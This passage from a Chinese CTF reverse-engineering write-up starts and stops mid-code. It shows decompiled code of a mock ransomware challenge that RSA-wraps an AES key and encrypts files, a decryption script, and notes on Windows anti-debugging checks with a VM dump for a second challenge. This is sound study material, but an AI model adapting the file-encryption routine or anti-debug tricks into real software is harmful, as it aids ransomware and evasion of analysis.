class="number">1</span>;</span><br><span class="line">      append(&amp;v44, (<span class="keyword">int</span>)aWannareverse, <span class="number">13u</span>);    <span class="comment">// toDebug</span></span><br><span class="line">      LOBYTE(v47) = <span class="number">2</span>;</span><br><span class="line">      v45.next = <span class="number">0</span>;</span><br><span class="line">      v45.len = <span class="number">0</span>;</span><br><span class="line">      v45.maxLen = <span class="number">0</span>;</span><br><span class="line">      v18 = (BigInteger *)<span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">      v45.next = v18;</span><br><span class="line">      v18-&gt;next = <span class="number">0</span>;</span><br><span class="line">      *(_DWORD *)v18-&gt;data = <span class="number">0</span>;</span><br><span class="line">      v45.next-&gt;next = &amp;v45;</span><br><span class="line">      v45.len = <span class="number">0</span>;</span><br><span class="line">      v45.maxLen = <span class="number">15</span>;</span><br><span class="line">      v45.data[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      LOBYTE(v47) = <span class="number">3</span>;</span><br><span class="line">      initBigInteger(&amp;v43, arg2);</span><br><span class="line">      LOBYTE(v47) = <span class="number">4</span>;</span><br><span class="line">      v19 = (BigInteger *)rsaEncrypt((<span class="keyword">int</span>)v42, (<span class="keyword">int</span>)&amp;v43);</span><br><span class="line">      <span class="keyword">if</span> ( &amp;v45 != v19 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_403580((<span class="keyword">int</span> *)&amp;v45);</span><br><span class="line">        LOBYTE(arg2) = <span class="number">0</span>;</span><br><span class="line">        base64((<span class="keyword">char</span> *)&amp;v45, v19, (<span class="keyword">int</span>)arg2);</span><br><span class="line">      &#125;</span><br><span class="line">      sub_403580(v42);</span><br><span class="line">      sub_4037D0(v42);</span><br><span class="line">      LOBYTE(v47) = <span class="number">3</span>;</span><br><span class="line">      sub_403580((<span class="keyword">int</span> *)&amp;v43);</span><br><span class="line">      sub_4037D0((<span class="keyword">int</span> *)&amp;v43);</span><br><span class="line">      v20 = v45.data;</span><br><span class="line">      <span class="keyword">if</span> ( v45.maxLen &gt;= <span class="number">0x10</span>u )</span><br><span class="line">        v20 = *(<span class="keyword">char</span> **)v45.data;</span><br><span class="line">      v21 = (BigInteger *)sub_4024D0(v20, v42, v45.len);</span><br><span class="line">      <span class="keyword">if</span> ( &amp;v45 != v21 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_403580((<span class="keyword">int</span> *)&amp;v45);</span><br><span class="line">        LOBYTE(arg2) = <span class="number">0</span>;</span><br><span class="line">        base64((<span class="keyword">char</span> *)&amp;v45, v21, (<span class="keyword">int</span>)arg2);</span><br><span class="line">      &#125;</span><br><span class="line">      LOBYTE(v47) = <span class="number">3</span>;</span><br><span class="line">      sub_403580(v42);</span><br><span class="line">      sub_4037D0(v42);</span><br><span class="line">      v22 = v45.data;</span><br><span class="line">      <span class="keyword">if</span> ( v45.maxLen &gt;= <span class="number">0x10</span>u )</span><br><span class="line">        v22 = *(<span class="keyword">char</span> **)v45.data;</span><br><span class="line">      append(&amp;v44, (<span class="keyword">int</span>)v22, v45.len);</span><br><span class="line">      v23 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( *(_OWORD *)&amp;v43.data[<span class="number">8</span>] = <span class="number">0</span>i64; v23 &lt; len; v23 += <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        aes((<span class="keyword">int</span>)&amp;v43.data[<span class="number">8</span>], (<span class="keyword">unsigned</span> __int8 *)&amp;buf_read_2[v23], (<span class="keyword">int</span>)key_1);</span><br><span class="line">        append(&amp;v44, (<span class="keyword">int</span>)&amp;v43.data[<span class="number">8</span>], <span class="number">0x10</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memset</span>(toWriteFileName, <span class="number">0</span>, <span class="number">256</span>);          <span class="comment">// make file name</span></span><br><span class="line">      v24 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v25 = aFlagTxt[v24++];</span><br><span class="line">        *((_BYTE *)&amp;v45.maxLen + v24 + <span class="number">3</span>) = v25;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v25 );</span><br><span class="line">      v26 = (<span class="keyword">char</span> *)&amp;v45.maxLen + <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v27 = (v26++)[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">while</span> ( v27 );</span><br><span class="line">      <span class="built_in">strcpy</span>(v26, <span class="string">&quot;.Encry&quot;</span>);</span><br><span class="line">      v37 = <span class="number">0</span>;</span><br><span class="line">      FILE_write = fopen(toWriteFileName, <span class="string">&quot;wb&quot;</span>);<span class="comment">// make file name</span></span><br><span class="line">      v29 = FILE_write;</span><br><span class="line">      <span class="keyword">if</span> ( FILE_write )</span><br><span class="line">      &#123;</span><br><span class="line">        v30 = v44.len;</span><br><span class="line">        v31 = v44.data;</span><br><span class="line">        <span class="keyword">if</span> ( v44.maxLen &gt;= <span class="number">0x10</span>u )</span><br><span class="line">          LOBYTE(v31) = v44.data[<span class="number">0</span>];</span><br><span class="line">        v32 = fwrite((<span class="keyword">char</span>)v31, <span class="number">1</span>, v44.len, FILE_write);</span><br><span class="line">        v33 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v30 == v32 )</span><br><span class="line">          v33 = <span class="number">1</span>;</span><br><span class="line">        v37 = v33;</span><br><span class="line">      &#125;</span><br><span class="line">      fclose(v29);</span><br><span class="line">      sub_403580((<span class="keyword">int</span> *)&amp;v45);</span><br><span class="line">      sub_4037D0((<span class="keyword">int</span> *)&amp;v45);</span><br><span class="line">      sub_403580((<span class="keyword">int</span> *)&amp;v44);</span><br><span class="line">      sub_4037D0((<span class="keyword">int</span> *)&amp;v44);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      sub_415950(buf_read_2);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(FILE_read_2);</span><br><span class="line">  <span class="keyword">return</span> v37;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

    主要做了以下事情：

   1. 打开文件，判断文件头，如果是WannaReverse就不加密直接退出
   2. 打开一个buffer，然后放入WannaReverse
   3. 使用RSA加密上一步生成的密钥然后base64
   4. 把加密过的密钥放入buffer
   5. AES加密文件内容，然后放入buffer
   6. 生成文件名，写入文件

4. RSA私钥在clickme.exe中可以找到

解密脚本

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES,DES,PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a = [<span class="number">0x5C</span>,<span class="number">0xBC</span>,<span class="number">0xEA</span>,<span class="number">0x89</span>,<span class="number">0xBA</span>,<span class="number">0x2B</span>,<span class="number">0x18</span>,<span class="number">0x27</span>,<span class="number">0x79</span>,<span class="number">0x3F</span>,<span class="number">0x13</span>,<span class="number">0x0A</span>,<span class="number">0x8A</span>,<span class="number">0x97</span>,<span class="number">0xB4</span>,<span class="number">0x9B</span>,<span class="number">0xCD</span>,<span class="number">0x78</span>,<span class="number">0x9B</span>,<span class="number">0xD8</span>,<span class="number">0x35</span>,<span class="number">0x92</span>,<span class="number">0x05</span>,<span class="number">0x45</span>,<span class="number">0x4C</span>,<span class="number">0x22</span>,<span class="number">0xA5</span>,<span class="number">0x69</span>,<span class="number">0x37</span>,<span class="number">0xEB</span>,<span class="number">0x6E</span>,<span class="number">0x2B</span>,<span class="number">0x0E</span>,<span class="number">0xBD</span>,<span class="number">0x84</span>,<span class="number">0x0F</span>,<span class="number">0x91</span>,<span class="number">0x61</span>,<span class="number">0x38</span>,<span class="number">0xF6</span>,<span class="number">0xF1</span>,<span class="number">0xBA</span>,<span class="number">0x99</span>,<span class="number">0x19</span>,<span class="number">0x41</span>,<span class="number">0x72</span>,<span class="number">0x07</span>,<span class="number">0x91</span>,<span class="number">0xF0</span>,<span class="number">0x26</span>,<span class="number">0x68</span>,<span class="number">0x06</span>,<span class="number">0x61</span>,<span class="number">0x26</span>,<span class="number">0x5C</span>,<span class="number">0x20</span>,<span class="number">0x35</span>,<span class="number">0xDD</span>,<span class="number">0xCF</span>,<span class="number">0xFC</span>,<span class="number">0x77</span>,<span class="number">0x57</span>,<span class="number">0x54</span>,<span class="number">0x81</span>,<span class="number">0xF2</span>,<span class="number">0xF2</span>,<span class="number">0xE4</span>,<span class="number">0xAF</span>,<span class="number">0xBF</span>,<span class="number">0xA2</span>,<span class="number">0x1D</span>,<span class="number">0x29</span>,<span class="number">0xAE</span>,<span class="number">0x6C</span>,<span class="number">0x08</span>,<span class="number">0x3B</span>,<span class="number">0x76</span>,<span class="number">0x1B</span>,<span class="number">0x66</span>,<span class="number">0xB8</span>,<span class="number">0xFE</span>,<span class="number">0x72</span>,<span class="number">0xCB</span>,<span class="number">0xD6</span>,<span class="number">0x94</span>,<span class="number">0xC3</span>,<span class="number">0xD5</span>,<span class="number">0x6A</span>,<span class="number">0xE7</span>,<span class="number">0x0C</span>,<span class="number">0x7A</span>,<span class="number">0x28</span>,<span class="number">0xDC</span>,<span class="number">0xBC</span>,<span class="number">0xAC</span>,<span class="number">0x80</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;30776159143604297789676442413079&#x27;</span></span><br><span class="line">aes = AES.new(key,mode=AES.MODE_ECB)</span><br><span class="line">r = aes.decrypt(bytes(a))</span><br><span class="line">print(str(r,encoding=<span class="string">&#x27;utf-16&#x27;</span>))</span><br></pre></td></tr></table></figure>

## [rev][V&amp;N2020 公开赛]h01k_re

找到了这篇文章https://www.gironsec.com/blog/2013/12/other-antidebug-tricks/
https://www.sohu.com/a/249321179_354899
CsrGetProcessId is a native API that returns the PID of csrss.exe
这个函数返回csrss.exe的PID

大概是一种反调试技术,程序尝试获取csrss.exe的pid，然后openProcess。由于大多数调制器需要管理越权限，所以如果当前进程成功打开csrss.exe，就可以判断为被调试。

CheckRemoteDebuggerPresent

NtQueryInformationProcess第三个参数，如果有调试器，就会返回-1

好家伙一整个反调试函数，我直接给你nop掉

\_\_rdtsc返回时间辍

经过调试发现程序把自己载入内存，然后查找getflag函数，似乎作了一些变换，但是不去管，我tm直接将对应的区段保存为文件，然后是个可执行文件，IDA打开

1. v3的信息：

   - 0是个计数器
   - 14是v7，v7+8是输入长度，v7+20为off input-off v4
   - 1是800
   - 12是和800有关的数
   - 13是off v4

2. 看答案了，确实是虚拟机，可以在输入下硬件断点，发现是一组异或

3. 对于输入下硬件断点，并且输入经过处理后存入的目标内存也下硬件断点，就可以调试出程序的主逻辑

后续分析

1. 以上分析到了vm，进入到vm，首先是个大循环，下面有个函数调用，参数是10006890，调试获得这个地方真实的数据

   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">10096890 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</span><br><span class="line">100968A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</span><br><span class="line">100968B0 01 00 00 00 00 00 00 00 80 97 00 10 00 00 00 00 ................</span><br><span class="line">100968C0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">100968D0 02 00 00 00 00 00 00 00 C0 97 00 10 00 00 00 00 ........À.......</span><br><span class="line">100968E0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">100968F0 03 00 00 00 00 00 00 00 A0 95 00 10 00 00 00 00 ........ .......</span><br><span class="line">10096900 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096910 04 00 00 00 00 00 00 00 F0 95 00 10 00 00 00 00 ........ð.......</span><br><span class="line">10096920 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096930 05 00 00 00 00 00 00 00 30 97 00 10 00 00 00 00 ........0.......</span><br><span class="line">10096940 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096950 06 00 00 00 20 00 9D 00 E0 96 00 10 00 00 00 00 .... ...à.......</span><br><span class="line">10096960 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096970 07 00 00 00 FF FF FF FF 40 96 00 10 00 00 00 00 ....ÿÿÿÿ@.......</span><br><span class="line">10096980 00 00 00 00 00 00 00 00 02 00 00 00 01 00 00 00 ................</span><br><span class="line">10096990 08 00 00 00 00 00 00 00 90 96 00 10 00 00 00 00 ................</span><br><span class="line">100969A0 00 00 00 00 00 00 00 00 02 00 00 00 AC 06 02 77 ............¬..w</span><br><span class="line">100969B0 09 00 00 00 00 00 00 00 80 75 00 10 00 00 00 00 .........u......</span><br><span class="line">100969C0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">100969D0 0A 00 00 00 00 00 00 00 D0 75 00 10 00 00 00 00 ........Ðu......</span><br><span class="line">100969E0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">100969F0 0B 00 00 00 70 F7 36 00 20 A0 00 10 00 00 00 00 ....p÷6.  ......</span><br><span class="line">10096A00 00 00 00 00 00 00 00 00 02 00 00 00 34 B2 00 10 ............4²..</span><br><span class="line">10096A10 0C 00 00 00 A0 07 00 00 70 A0 00 10 00 00 00 00 .... ...p ......</span><br><span class="line">10096A20 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096A30 0D 00 00 00 00 00 00 00 30 98 00 10 00 00 00 00 ........0.......</span><br><span class="line">10096A40 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096A50 0E 00 00 00 00 E0 FD 7E 80 98 00 10 00 00 00 00 .....àý~........</span><br><span class="line">10096A60 00 00 00 00 00 00 00 00 02 00 00 00 18 00 00 00 ................</span><br><span class="line">10096A70 0F 00 00 00 66 34 03 77 10 80 00 10 00 00 00 00 ....f4.w........</span><br><span class="line">10096A80 00 00 00 00 00 00 00 00 02 00 00 00 48 B5 79 00 ............Hµy.</span><br><span class="line">10096A90 10 00 00 00 00 00 79 00 70 80 00 10 00 00 00 00 ......y.p.......</span><br><span class="line">10096AA0 00 00 00 00 00 00 00 00 02 00 00 00 0C 2A 08 01 .............*..</span><br><span class="line">10096AB0 11 00 00 00 FF FF FF FF 40 99 00 10 00 00 00 00 ....ÿÿÿÿ@.......</span><br><span class="line">10096AC0 00 00 00 00 00 00 00 00 02 00 00 00 4C 17 00 00 ............L...</span><br><span class="line">10096AD0 12 00 00 00 99 5A 00 00 90 99 00 10 00 00 00 00 .....Z..........</span><br><span class="line">10096AE0 00 00 00 00 00 00 00 00 02 00 00 00 33 00 00 00 ............3...</span><br><span class="line">10096AF0 13 00 00 00 00 00 00 00 20 AB 00 10 00 00 00 00 ........ «......</span><br><span class="line">10096B00 00 00 00 00 00 00 00 00 02 00 00 00 C0 00 00 00 ............À...</span><br><span class="line">10096B10 14 00 00 00 B9 AC 08 77 70 AB 00 10 00 00 00 00 ....¹¬.wp«......</span><br><span class="line">10096B20 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096B30 15 00 00 00 02 1E 7A 00 70 76 00 10 00 00 00 00 ......z.pv......</span><br><span class="line">10096B40 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096B50 16 00 00 00 A0 07 00 00 C0 76 00 10 00 00 00 00 .... ...Àv......</span><br><span class="line">10096B60 00 00 00 00 00 00 00 00 02 00 00 00 D7 EE 02 77 ............×î.w</span><br><span class="line">10096B70 17 00 00 00 00 00 79 01 00 99 00 10 00 00 00 00 ......y.........</span><br><span class="line">10096B80 00 00 00 00 00 00 00 00 01 00 00 00 FE FF FF FF ............þÿÿÿ</span><br><span class="line">10096B90 18 00 00 00 06 14 0D 77 E0 9D 00 10 00 00 00 00 .......wà.......</span><br><span class="line">10096BA0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096BB0 19 00 00 00 04 00 00 00 30 9E 00 10 00 00 00 00 ........0.......</span><br><span class="line">10096BC0 00 00 00 00 00 00 00 00 02 00 00 00 22 14 0D 77 ............&quot;..w</span><br><span class="line">10096BD0 1A 00 00 00 00 00 00 00 90 9E 00 10 00 00 00 00 ................</span><br><span class="line">10096BE0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 79 00 ..............y.</span><br><span class="line">10096BF0 1B 00 00 00 20 00 00 00 E0 9E 00 10 00 00 00 00 .... ...à.......</span><br><span class="line">10096C00 00 00 00 00 00 00 00 00 02 00 00 00 3D 30 03 77 ............&#x3D;0.w</span><br><span class="line">10096C10 1C 00 00 00 A4 F5 36 00 C0 7E 00 10 00 00 00 00 ....¤õ6.À~......</span><br><span class="line">10096C20 00 00 00 00 00 00 00 00 02 00 00 00 B0 1D 7A 00 ............°.z.</span><br><span class="line">10096C30 1D 00 00 00 CD 4D 07 77 80 9A 00 10 00 00 00 00 ....ÍM.w........</span><br><span class="line">10096C40 00 00 00 00 00 00 00 00 01 00 00 00 00 10 50 00 ..............P.</span><br><span class="line">10096C50 1E 00 00 00 03 00 0A 00 C0 9A 00 10 00 00 00 00 ........À.......</span><br><span class="line">10096C60 00 00 00 00 00 00 00 00 01 00 00 00 00 00 79 00 ..............y.</span><br><span class="line">10096C70 1F 00 00 00 00 00 79 00 E0 99 00 10 00 00 00 00 ......y.à.......</span><br><span class="line">10096C80 00 00 00 00 00 00 00 00 01 00 00 00 E8 1F 7A 00 ............è.z.</span><br><span class="line">10096C90 20 00 00 00 A8 F4 36 00 F0 7A 00 10 00 00 00 00  ...¨ô6.ðz......</span><br><span class="line">10096CA0 00 00 00 00 00 00 00 00 01 00 00 00 2C 1B 0D 77 ............,..w</span><br><span class="line">10096CB0 21 00 00 00 2C 1B 0D 77 50 7B 00 10 00 00 00 00 !...,..wP&#123;......</span><br><span class="line">10096CC0 00 00 00 00 00 00 00 00 01 00 00 00 00 00 79 00 ..............y.</span><br><span class="line">10096CD0 22 00 00 00 00 00 50 00 B0 7B 00 10 00 00 00 00 &quot;.....P.°&#123;......</span><br><span class="line">10096CE0 00 00 00 00 00 00 00 00 01 00 00 00 E0 1F 7A 00 ............à.z.</span><br><span class="line">10096CF0 23 00 00 00 E0 1F 7A 00 10 7C 00 10 00 00 00 00 #...à.z..|......</span><br><span class="line">10096D00 00 00 00 00 00 00 00 00 01 00 00 00 48 1B 0D 77 ............H..w</span><br><span class="line">10096D10 24 00 00 00 AC 49 06 77 70 9D 00 10 00 00 00 00 $...¬I.wp.......</span><br><span class="line">10096D20 00 00 00 00 00 00 00 00 00 00 00 00 66 34 03 77 ............f4.w</span><br><span class="line">10096D30 25 00 00 00 54 F4 36 00 F0 92 00 10 00 00 00 00 %...Tô6.ð.......</span><br><span class="line">10096D40 00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 ................</span><br><span class="line">10096D50 26 00 00 00 B0 1D 7A 00 20 93 00 10 00 00 00 00 &amp;...°.z. .......</span><br><span class="line">10096D60 00 00 00 00 00 00 00 00 01 00 00 00 7F 00 00 00 ................</span><br><span class="line">10096D70 27 00 00 00 A6 06 00 00 90 7D 00 10 00 00 00 00 &#39;...¦....&#125;......</span><br><span class="line">10096D80 00 00 00 00 00 00 00 00 02 00 00 00 F8 03 00 00 ............ø...</span><br><span class="line">10096D90 28 00 00 00 50 01 79 00 20 7E 00 10 00 00 00 00 (...P.y. ~......</span><br><span class="line">10096DA0 00 00 00 00 00 00 00 00 02 00 00 00 E2 1F 7A 00 ............â.z.</span><br><span class="line">10096DB0 29 00 00 00 00 00 00 00 70 92 00 10 00 00 00 00 ).......p.......</span><br><span class="line">10096DC0 00 00 00 00 00 00 00 00 01 00 00 00 8C F4 36 00 .............ô6.</span><br><span class="line">10096DD0 2A 00 00 00 94 AA 08 77 B0 92 00 10 00 00 00 00 *....ª.w°.......</span><br><span class="line">10096DE0 00 00 00 00 00 00 00 00 01 00 00 00 00 00 79 00 ..............y.</span><br><span class="line">10096DF0 2B 00 00 00 B0 1D 7A 00 60 93 00 10 00 00 00 00 +...°.z.&#96;.......</span><br><span class="line">10096E00 00 00 00 00 00 00 00 00 01 00 00 00 74 F4 36 00 ............tô6.</span><br><span class="line">10096E10 2C 00 00 00 36 A4 08 77 A0 93 00 10 00 00 00 00 ,...6¤.w .......</span><br><span class="line">10096E20 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................</span><br><span class="line">10096E30 2D 00 00 00 00 02 04 06 30 90 00 10 00 00 00 00 -.......0.......</span><br><span class="line">10096E40 00 00 00 00 00 00 00 00 01 00 00 00 30 09 00 00 ............0...</span><br><span class="line">10096E50 2E 00 00 00 00 00 00 00 70 90 00 10 00 00 00 00 ........p.......</span><br><span class="line">10096E60 00 00 00 00 00 00 00 00 01 00 00 00 F0 0F 00 00 ............ð...</span><br><span class="line">10096E70 2F 00 00 00 ED 33 03 77 C0 90 00 10 00 00 00 00 &#x2F;...í3.wÀ.......</span><br><span class="line">10096E80 00 00 00 00 00 00 00 00 01 00 00 00 70 10 3C 76 ............p.&lt;v</span><br><span class="line">10096E90 30 00 00 00 00 00 79 00 00 91 00 10 00 00 00 00 0.....y.........</span><br><span class="line">10096EA0 00 00 00 00 00 00 00 00 01 00 00 00 7F 00 00 00 ................</span><br><span class="line">10096EB0 31 00 00 00 30 09 00 00 50 91 00 10 00 00 00 00 1...0...P.......</span><br><span class="line">10096EC0 00 00 00 00 00 00 00 00 01 00 00 00 D8 00 00 00 ............Ø...</span><br><span class="line">10096ED0 32 00 00 00 F0 0F 00 00 90 91 00 10 00 00 00 00 2...ð...........</span><br><span class="line">10096EE0 00 00 00 00 00 00 00 00 01 00 00 00 55 A5 08 77 ............U¥.w</span><br><span class="line">10096EF0 33 00 00 00 88 F2 36 00 E0 91 00 10 00 00 00 00 3....ò6.à.......</span><br><span class="line">10096F00 00 00 00 00 00 00 00 00 01 00 00 00 CA DA 07 77 ............ÊÚ.w</span><br><span class="line">10096F10 34 00 00 00 00 00 00 00 20 92 00 10 00 00 00 00 4....... .......</span><br><span class="line">10096F20 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................</span><br></pre></td></tr></table></figure>
2. 可以看到，前面是一个数字，后面是一系列的地址
3. vm函数地址为10005960,IDA中的地址为10006560,可以得到基址-c00
4. 继续调试发现，后面调用的函数就是对应位置的函数
5. 调试发现1007f15c不做任何事直接返回
6. 使用脚本处理上面dump出的数据，得到地址。另外opcode和vm_eip都可以分析出

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES,DES,PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># add = []</span></span><br><span class="line"><span class="comment"># with open(&#x27;1.txt&#x27;,&#x27;r&#x27;) as f:</span></span><br><span class="line"><span class="comment">#     lines = f.readlines()</span></span><br><span class="line"><span class="comment">#     for i in range(0,len(lines),2):</span></span><br><span class="line"><span class="comment">#         l = lines[i][:-1]</span></span><br><span class="line"><span class="comment">#         f = l[0:2][::-1]+l[2:4][::-1]+l[4:6][::-1]+l[6:8][::-1]</span></span><br><span class="line"><span class="comment">#         f = f[::-1]</span></span><br><span class="line"><span class="comment">#         f = int(f,16)</span></span><br><span class="line"><span class="comment">#         print(hex(f))</span></span><br><span class="line"><span class="comment">#         add.append(f+0xc00)</span></span><br><span class="line"><span class="comment"># print(add)</span></span><br><span class="line">add = [<span class="number">0</span>,<span class="number">268477312</span>, <span class="number">268477376</span>, <span class="number">268476832</span>, <span class="number">268476912</span>, <span class="number">268477232</span>, <span class="number">268477152</span>, <span class="number">268476992</span>, <span class="number">268477072</span>, <span class="number">268468608</span>, <span class="number">268468688</span>, <span class="number">268479520</span>, <span class="number">268479600</span>, <span class="number">268477488</span>, <span class="number">268477568</span>, <span class="number">268471312</span>, <span class="number">268471408</span>, <span class="number">268477760</span>, <span class="number">268477840</span>, <span class="number">268482336</span>, <span class="number">268482416</span>, <span class="number">268468848</span>, <span class="number">268468928</span>, <span class="number">268477696</span>, <span class="number">268478944</span>, <span class="number">268479024</span>, <span class="number">268479120</span>, <span class="number">268479200</span>, <span class="number">268470976</span>, <span class="number">268478080</span>, <span class="number">268478144</span>, <span class="number">268477920</span>, <span class="number">268470000</span>, <span class="number">268470096</span>, <span class="number">268470192</span>, <span class="number">268470288</span>, <span class="number">268478832</span>, <span class="number">268476144</span>, <span class="number">268476192</span>, <span class="number">268470672</span>, <span class="number">268470816</span>, <span class="number">268476016</span>, <span class="number">268476080</span>, <span class="number">268476256</span>, <span class="number">268476320</span>, <span class="number">268475440</span>, <span class="number">268475504</span>, <span class="number">268475584</span>, <span class="number">268475648</span>, <span class="number">268475728</span>, <span class="number">268475792</span>, <span class="number">268475872</span>, <span class="number">268475936</span>]</span><br><span class="line"></span><br><span class="line">opc = [<span class="number">1</span>,<span class="number">0</span>,<span class="string">&#x27;strlen(input)&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;v0 - self((int)v4)&#x27;</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">39</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">47</span>,<span class="number">1</span>,<span class="number">54</span>,<span 